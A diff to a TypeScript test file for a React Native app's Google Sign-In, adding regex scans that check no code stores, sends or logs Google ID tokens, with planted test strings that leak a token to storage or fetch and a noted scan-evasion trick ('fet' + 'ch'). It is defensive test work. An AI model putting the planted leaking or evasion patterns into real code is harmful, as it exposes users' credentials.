@@ -14,6 +14,17 @@ const root = join(__dirname, '..', '..', '..');
 const read = (...p: string[]) => readFileSync(join(root, ...p), 'utf8');
 const MODULE = '@react-native-google-signin/google-signin';
 
+// The scans, as functions, so each can be shown to bite on a planted case (BL-1946).
+const STORE_RE = /setItem|AsyncStorage|SecureStore|secure-storage|file-system|FileSystem|writeFile|MMKV|expo-sqlite/;
+const CRED_COLUMN_A = /(google|idp|oauth|provider|social)[a-z_ ]{0,12}(access|refresh|token|cred|secret|auth_?code|blob|payload|jwt|grant|assertion|json|raw|bearer)/i;
+const CRED_COLUMN_B = /(access|refresh|token|cred|secret|blob|payload|jwt|grant|assertion|bearer)[a-z_ ]{0,12}(google|idp|oauth|social)/i;
+const NET_RE = /\bfetch\(|XMLHttpRequest|WebSocket|sendBeacon|console\.(log|info|warn|error|debug)/;
+// import() or require() whose argument is not one plain string literal: a built-up module name hides a storage module.
+const NON_LITERAL_LOAD = /\b(import|require)\s*\(\s*(?!['"][^'"+]+['"]\s*\))/;
+const tokenFile = (src: string) => /idToken|GoogleSignin/.test(src);
+const storesToken = (src: string) => tokenFile(src) && (STORE_RE.test(src) || NON_LITERAL_LOAD.test(src));
+const credentialColumn = (sql: string) => CRED_COLUMN_A.test(sql) || CRED_COLUMN_B.test(sql);
+
 vi.mock('react-native', () => ({ Platform: { OS: 'ios' } }));
 
 const h = vi.hoisted(() => ({ writes: [] as string[], getTokens: vi.fn(), signOut: vi.fn(async () => {}), signIn: vi.fn() }));
@@ -117,14 +128,14 @@ describe('[NS-54-R7] no Google token stored by us', () => {
     for (const f of [...files(dir), ...files(join(root, 'apps', 'mobile', 'src', 'app'))]) {
       const s = readFileSync(f, 'utf8');
       expect(s, `${f} must not read Google tokens`).not.toMatch(/GoogleSignin\.(getTokens|addScopes|clearCachedAccessToken)|serverAuthCode/);
-      if (/idToken|GoogleSignin/.test(s)) expect(s, `${f} handles an ID token and must not send or log it`).not.toMatch(/\bfetch\(|XMLHttpRequest|WebSocket|sendBeacon|console\.(log|info|warn|error|debug)/);
+      if (tokenFile(s)) expect(s, `${f} handles an ID token and must not send or log it`).not.toMatch(NET_RE);
+      expect(storesToken(s), `${f} handles an ID token and must not write storage or build a module name`).toBe(false);
     }
   });
 
   it('our schema and Edge Functions have no place to keep one: no Google-ish credential column, no Google secret, no Google scope in config', () => {
     const sql = readdirSync(join(root, 'supabase', 'migrations')).map((n) => read('supabase/migrations', n)).join('\n');
-    expect(sql).not.toMatch(/(google|idp|oauth|provider|social)[a-z_ ]{0,12}(access|refresh|token|cred|secret|auth_?code)/i);
-    expect(sql).not.toMatch(/(access|refresh|token|cred|secret)[a-z_ ]{0,12}(google|idp|oauth|social)/i);
+    expect(credentialColumn(sql)).toBe(false);
     const fnFiles = (d: string): string[] => readdirSync(d, { withFileTypes: true }).flatMap((e) => (e.isDirectory() ? fnFiles(join(d, e.name)) : [join(d, e.name)]));
     for (const f of fnFiles(join(root, 'supabase', 'functions')).filter((p) => /\.(ts|tsx|json|toml)$/.test(p) && !/\.test\.|\/test\//.test(p))) {
       expect(readFileSync(f, 'utf8'), `${f} must not mention Google (secrets, calls, steps)`).not.toMatch(/google/i);
@@ -132,6 +143,32 @@ describe('[NS-54-R7] no Google token stored by us', () => {
     const cfg = read('supabase/config.toml');
     const block = cfg.slice(cfg.indexOf('[auth.external.google]')).split('\n').slice(0, 5).join('\n');
     expect(block).not.toMatch(/additional_scopes|scopes/);
+  });
+});
+
+describe('[NS-54-R7] the scans bite on planted cases (BL-1946; limits in the finding, section 5)', () => {
+  it('a sibling auth file that writes an idToken to storage, or builds a module name, is caught', () => {
+    expect(storesToken("const t = idToken; await AsyncStorage.setItem('k', t);")).toBe(true);
+    expect(storesToken("const t = idToken; await SecureStore.setItemAsync('k', t);")).toBe(true);
+    expect(storesToken("const t = idToken; const fs = await import('expo-' + 'file-system'); fs.writeAsStringAsync(u, t);")).toBe(true);
+    expect(storesToken("const t = idToken; const m = require(name);")).toBe(true);
+    expect(storesToken("const t = idToken; const m = require('plain-literal');")).toBe(false);
+    // Storage in a file with no token is fine (the check is about token-handling files).
+    expect(storesToken("await AsyncStorage.setItem('theme', 'dark');")).toBe(false);
+  });
+  it('a migration column that keeps a provider credential under another name is caught', () => {
+    for (const col of ['oauth_blob text', 'google_payload jsonb', 'idp_jwt text', 'social_grant text', 'bearer_google text']) {
+      expect(credentialColumn(`alter table t add column ${col};`), col).toBe(true);
+    }
+    expect(credentialColumn('alter table t add column display_name text;')).toBe(false);
+  });
+  it('a bare fetch or console call in a token-handling file is caught, and the scan is silent on a file with no token', () => {
+    expect(NET_RE.test("const idToken = x; fetch('https://example.invalid', { body: idToken });")).toBe(true);
+    expect(NET_RE.test("console.log(idToken)")).toBe(true);
+    // The limit, stated in the finding: the same call in a file with no idToken or GoogleSignin is not seen,
+    // and globalThis['fet' + 'ch'](...) is seen by no text scan. The runtime test above catches only the real path.
+    expect(tokenFile("fetch('https://example.invalid')")).toBe(false);
+    expect(NET_RE.test("globalThis['fet' + 'ch'](u)")).toBe(false);
   });
 });
 
